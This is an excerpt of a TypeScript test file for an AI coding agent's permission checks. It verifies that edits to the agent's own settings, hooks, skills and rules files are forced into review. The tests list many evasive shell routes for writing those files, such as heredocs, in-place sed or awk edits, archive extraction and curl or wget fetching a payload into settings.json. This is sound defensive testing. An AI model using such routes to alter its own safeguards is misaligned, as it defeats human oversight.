...
describe('isAutoModeProtectedWritePath', () => {
  it('matches Qwen self-modification files and directories', () => {
    const protectedPaths = [
      '/repo/.turbospark/settings.json',
      '/repo/.turbospark/settings.local.json',
      '/repo/TURBOSPARK.md',
      '/repo/AGENTS.md',
      '/repo/.turbospark/commands/review.md',
      '/repo/.turbospark/agents/reviewer.md',
      '/repo/.turbospark/skills/skill-a/SKILL.md',
      '/repo/.turbospark/hooks/pre-tool-use.json',
      '/repo/.turbospark/QWEN.local.md',
      '/repo/.turbospark/rules/backend.md',
      '/repo/.mcp.json',
      '/repo/.git',
    ];
  ...
  it('does not treat ordinary source files or worktree files as protected', () => {
    const ordinaryPaths = [
      '/repo/src/index.ts',
      '/repo/.turbospark/PROJECT_SUMMARY.md',
      '/repo/.turbospark/worktrees/feature/src/index.ts',
    ];
  ...
  it('still protects config surfaces inside managed worktrees', () => {
    const protectedPaths = [
      '/repo/.turbospark/worktrees/feature/.turbospark/settings.json',
      '/repo/.turbospark/worktrees/feature/AGENTS.md',
      '/repo/.turbospark/worktrees/feature/.turbospark/QWEN.local.md',
      '/repo/.turbospark/worktrees/feature/.turbospark/rules/backend.md',
      '/repo/.turbospark/worktrees/feature/.mcp.json',
    ];
  ...
  it('matches configured context filenames', () => {
    ...
    try {
      const protectedPaths = [
        ...
        '/repo/.turbospark/worktrees/feature/CUSTOM_AGENTS.md',
      ];
      ...
      setGeminiMdFilename(['TURBOSPARK.md', 'AGENTS.md']);
    }
  });

  it('matches self-modification surfaces in custom TURBOSPARK_HOME', () => {
    const originalQwenHome = process.env['TURBOSPARK_HOME'];
    process.env['TURBOSPARK_HOME'] = '/tmp/custom-qwen-home';
  ...
  it('matches real paths under a symlinked custom TURBOSPARK_HOME', () => {
    const originalQwenHome = process.env['TURBOSPARK_HOME'];
    ...
    try {
      ...
      process.env['TURBOSPARK_HOME'] = linkedHome;
  ...
  it('re-resolves write paths after symlinks are created', () => {
    ...
    try {
      const protectedDir = path.join(tmpRoot, '.turbospark');
  ...
  it('caches normalized TURBOSPARK_HOME prefixes per configured home', () => {
    const originalQwenHome = process.env['TURBOSPARK_HOME'];
    ...
    try {
      ...
      fs.writeFileSync(settingsPath, '{}');
      process.env['TURBOSPARK_HOME'] = tmpRoot;
...
describe('passesAcceptEditsFastPath', () => {
  ...
  it('rejects Qwen self-modification paths even inside cwd', () => {
    const protectedPaths = [
      `${cwd}/.turbospark/settings.json`,
      `${cwd}/.turbospark/settings.local.json`,
      `${cwd}/TURBOSPARK.md`,
      `${cwd}/AGENTS.md`,
      `${cwd}/.turbospark/commands/review.md`,
      `${cwd}/.turbospark/agents/reviewer.md`,
      `${cwd}/.turbospark/skills/review/SKILL.md`,
      `${cwd}/.turbospark/hooks/pre-tool-use.json`,
      `${cwd}/.turbospark/QWEN.local.md`,
      `${cwd}/.turbospark/rules/backend.md`,
      `${cwd}/.mcp.json`,
    ];
  ...
  it('allows ordinary files under .turbospark/worktrees but rejects nested config surfaces', () => {
    expect(
      passesAcceptEditsFastPath(
        ctx({
          toolName: ToolNames.WRITE_FILE,
          filePath: `${cwd}/.turbospark/worktrees/feature/src/index.ts`,
        }),
        config,
      ),
    ).toBe(true);
    ...
    expect(
      passesAcceptEditsFastPath(
        ctx({
          toolName: ToolNames.WRITE_FILE,
          filePath: `${cwd}/.turbospark/worktrees/feature/.turbospark/settings.json`,
        }),
        config,
      ),
    ).toBe(false);
  ...
  it('rejects symlinks that resolve to protected self-modification paths', () => {
    ...
    try {
      const turbosparkDir = path.join(tmpRoot, '.turbospark');
      fs.mkdirSync(turbosparkDir, { recursive: true });
      const target = path.join(turbosparkDir, 'settings.json');
...
describe('shouldForceAutoModeReviewForAllow', () => {
  it('returns true for Edit/Write targeting protected self-modification paths', () => {
    expect(
      shouldForceAutoModeReviewForAllow(
        ctx({
          toolName: ToolNames.EDIT,
          filePath: '/Users/test/.turbospark/settings.json',
        }),
      ),
    ).toBe(true);
    ...
    expect(
      shouldForceAutoModeReviewForAllow(
        ctx({
          toolName: ToolNames.WRITE_FILE,
          filePath: '/repo/.turbospark/QWEN.local.md',
        }),
      ),
    ).toBe(true);
    ...
    expect(
      shouldForceAutoModeReviewForAllow(
        ctx({
          ...
          filePath: '/repo/.turbospark/skills/review/demo.ipynb',
        }),
      ),
    ).toBe(true);
  });
    ...
    expect(
      shouldForceAutoModeReviewForAllow(
        ctx({
          ...
          command: 'bash -lc \'echo "{}" > .turbospark/settings.json\'',
          cwd: '/repo',
        }),
      ),
    ).toBe(true);
  ...
  it('returns true for nested wrappers writing protected paths after `cd`', () => {
    ...
    expect(
      shouldForceAutoModeReviewForAllow(
        ctx({
          toolName: ToolNames.SHELL,
          command: "cd .turbospark && bash -lc 'echo {} > settings.json'",
          cwd: '/repo',
        }),
      ),
    ).toBe(true);
  ...
  it('returns true for relative writes after an unresolved dynamic `cd`', () => {
    ...
    // `cd "$TURBOSPARK_HOME" && echo > settings.json`.
    expect(
      shouldForceAutoModeReviewForAllow(
        ctx({
          toolName: ToolNames.SHELL,
          command: 'cd "$TURBOSPARK_HOME" && echo "{}" > settings.json',
          cwd: '/repo',
        }),
      ),
    ).toBe(true);
  ...
  it('returns true for shell-like commands writing protected paths after cd', () => {
    expect(
      shouldForceAutoModeReviewForAllow(
        ctx({
          toolName: ToolNames.SHELL,
          command: 'cd .turbospark && echo "{}" > settings.json',
          cwd: '/repo',
        }),
      ),
    ).toBe(true);
    ...
    expect(
      shouldForceAutoModeReviewForAllow(
        ctx({
          toolName: ToolNames.MONITOR,
          command: 'bash -lc \'cd .turbospark && echo "{}" > settings.json\'',
          cwd: '/repo',
        }),
      ),
    ).toBe(true);
  ...
  it('returns true for protected writes in sibling segments after shell wrappers', () => {
    expect(
      shouldForceAutoModeReviewForAllow(
        ctx({
          toolName: ToolNames.SHELL,
          command: "bash -lc 'echo ok' && echo hi > .turbospark/settings.json",
          cwd: '/repo',
        }),
      ),
    ).toBe(true);
  ...
  it('returns true for protected write commands embedded in heredoc bodies', () => {
    expect(
      shouldForceAutoModeReviewForAllow(
        ctx({
          ...
          command: [
            "bash <<'SCRIPT'",
            'cp /tmp/payload .turbospark/settings.json',
            'SCRIPT',
          ].join('\n'),
          cwd: '/repo',
        }),
    ...
    for (const command of [
      ["bash <<'SCRIPT'", "tee .turbospark/settings.json <<< '{}'", 'SCRIPT'].join(
        '\n',
      ),
      [
        "bash <<'SCRIPT'",
        'dd if=/tmp/payload of=.turbospark/settings.json',
        'SCRIPT',
      ].join('\n'),
      [
        "bash <<'SCRIPT'",
        'sort -o .turbospark/settings.json /dev/null',
        'SCRIPT',
      ].join('\n'),
      [
        "bash <<'SCRIPT'",
        "node -e \"require('fs').writeFileSync('.turbospark/settings.json', '{}')\"",
        'SCRIPT',
      ].join('\n'),
    ]) {
      expect(
  ...
  it('returns true for protected write commands with variable destinations', () => {
    expect(
      shouldForceAutoModeReviewForAllow(
        ctx({
          toolName: ToolNames.SHELL,
          command: 'D=.turbospark/settings.json; cp payload "$D"',
          cwd: '/repo',
        }),
      ),
    ).toBe(true);
  ...
  it('returns true for awk in-place edits to protected paths', () => {
    for (const command of [
      'awk -i inplace \'{gsub(/x/, "y")}1\' .turbospark/settings.json',
      'gawk -i inplace \'{gsub(/x/, "y")}1\' .turbospark/settings.json',
    ]) {
      expect(
        shouldForceAutoModeReviewForAllow(
          ctx({
  ...
  it('returns true for sort writing protected paths via output flags', () => {
    for (const command of [
      'sort -o .turbospark/settings.json /dev/null',
      'sort --output=.turbospark/settings.json /dev/null',
    ]) {
      expect(
        shouldForceAutoModeReviewForAllow(
          ctx({
  ...
  it('returns true for bidirectional redirects to protected paths', () => {
    expect(
      shouldForceAutoModeReviewForAllow(
        ctx({
          toolName: ToolNames.SHELL,
          command: 'cat <> .turbospark/settings.json',
          cwd: '/repo',
        }),
      ),
    ).toBe(true);
  ...
  it('returns true for target-directory writes to protected filenames', () => {
    expect(
      shouldForceAutoModeReviewForAllow(
        ctx({
          toolName: ToolNames.SHELL,
          command: 'cp -t .turbospark /tmp/settings.json',
          cwd: '/repo',
        }),
      ),
    ).toBe(true);
  ...
  it('returns true for downloader output flags targeting protected paths', () => {
    for (const command of [
      'curl -o .turbospark/settings.json https://example.com/payload',
      'curl -o.turbospark/settings.json https://example.com/payload',
      'wget -O .turbospark/settings.json https://example.com/payload',
      'wget -O.turbospark/settings.json https://example.com/payload',
    ]) {
      expect(
        shouldForceAutoModeReviewForAllow(
  ...
  it('returns true for archive extraction commands targeting protected dirs', () => {
    for (const command of [
      'tar xf payload.tar -C .turbospark/skills',
      'tar xf payload.tar -C.turbospark/skills',
      'tar xf payload.tar --directory=.turbospark/skills',
      'unzip payload.zip -d .turbospark/skills',
      'unzip payload.zip -d.turbospark/skills',
      'cpio -i -D .turbospark/skills',
      'cpio -i -D.turbospark/skills',
    ]) {
      expect(
        shouldForceAutoModeReviewForAllow(
  ...
  it('returns true for find exec writes with placeholder operands', () => {
    expect(
      shouldForceAutoModeReviewForAllow(
        ctx({
          toolName: ToolNames.SHELL,
          command: 'find . -exec cp {} .turbospark/settings.json ;',
          cwd: '/repo',
        }),
      ),
    ).toBe(true);
  ...
  it('returns true for find execdir writes with placeholder operands', () => {
    expect(
      shouldForceAutoModeReviewForAllow(
        ctx({
          toolName: ToolNames.SHELL,
          command: 'find . -execdir cp {} .turbospark/settings.json ;',
          cwd: '/repo',
        }),
      ),
    ).toBe(true);
  ...
  it('returns true for long in-place sed/perl writes to protected paths', () => {
    for (const command of [
      "sed --in-place 's/x/y/' .turbospark/settings.json",
      "sed --in-place=.bak 's/x/y/' .turbospark/settings.json",
      "perl --in-place -e 's/x/y/' .turbospark/settings.json",
    ]) {
      expect(
        shouldForceAutoModeReviewForAllow(
          ctx({
  ...
  it('returns false for read-only sed/perl commands', () => {
    for (const command of [
      ...
      "sed -n '1,10p' .turbospark/settings.json",
    ]) {
      expect(
        shouldForceAutoModeReviewForAllow(
          ctx({
